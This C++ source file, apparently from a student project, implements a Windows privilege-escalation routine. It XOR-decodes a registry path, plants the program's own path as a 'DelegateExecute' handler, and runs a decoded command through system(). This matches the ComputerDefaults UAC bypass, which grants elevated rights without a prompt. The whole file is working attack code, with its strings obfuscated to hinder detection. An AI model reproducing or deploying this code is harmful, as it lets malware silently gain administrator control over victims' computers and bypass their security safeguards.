/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   cddefaults.cpp                                     :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: zcadinot <zcadinot@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/08/24 05:40:00 by zcadinot          #+#    #+#             */
/*   Updated: 2026/08/24 05:40:00 by zcadinot          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "privesc.hpp"


bool elevate_computerdefaults()
{
	char *path = get_myh_path();

	std::string regg_path;

    regg_path = key_xor(
        std::string(path_reg, sizeof(FHELPER) - 1),
        XOR_KEY
    );

	create_key(regg_path.c_str());
	set_value(regg_path.c_str(), "DelegateExecute", path);
	set_value(regg_path.c_str(), NULL, path);
	std::string reg_path;

    reg_path = key_xor(
        std::string(CDDEFAULTS, sizeof(CDDEFAULTS) - 1),
        XOR_KEY
    );
    system(reg_path.c_str());
	ExitProcess(0);
	return (true);
}
